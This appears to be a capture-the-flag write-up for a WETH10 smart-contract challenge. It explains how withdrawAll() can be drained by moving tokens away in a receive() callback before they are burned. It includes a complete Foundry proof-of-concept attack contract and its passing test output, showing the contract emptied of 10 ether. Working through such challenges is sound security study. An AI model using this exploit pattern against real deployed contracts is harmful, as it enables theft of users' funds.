# Two problems:
1. The function `execute()` is dangerous, it can be used to call functions like `ERC20.approve()` with the `msg.sender` being itself, but it's not the key to this challenge.
2. The key vulnerability is the `withdrawAll()`, attacker can use a `fallback` function to transfer away the WETH10 token before it's burned. So we can obtain "free" tokens by repeatedly `deposit()` and `withdrawAll()`, and finally withdraw the "free" tokens to 10 ether.


# POC (Foundry)
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/WETH10.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);

        // hack time!
        BobContract bc = new BobContract(weth);

        // give contract 1 ether
        bc.deposit{value: 1 ether}();

        // run 10 rounds, each round increases bob's token by 1 ether.
        for(uint i=0; i<10; i++) {
            bc.oneRound();
        }

        // so far, bob should have 10eth of WETH10, now withdraw to ether
        weth.withdrawAll();

        // bob get back 1 ether from the contract
        bc.withdraw();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract BobContract {
    address bob;
    WETH10 weth;

    constructor(WETH10 _weth) {
        bob = msg.sender;
        weth = _weth;
    }

    // bob deposit 1 ether for further operations
    function deposit() external payable {}
    // bob withdraw 1 ether after all done
    function withdraw() external { 
        Address.sendValue(payable(bob), 1 ether);
    }

    // each round costs nothing but gains 1 ether of WETH10 token
    function oneRound() external payable {
        weth.deposit{value: 1 ether}();
        weth.withdrawAll();
    }

    receive() external payable {
        // transfer away the WETH10 token to prevent being burned.
        weth.transfer(address(bob), 1 ether);
    }
}

```

# output
> Running 1 test for test/WETH10.t.sol:Weth10Test
>
> [PASS] testHack() (gas: 671480)
>
> Test result: ok. 1 passed; 0 failed; finished in 719.57µs
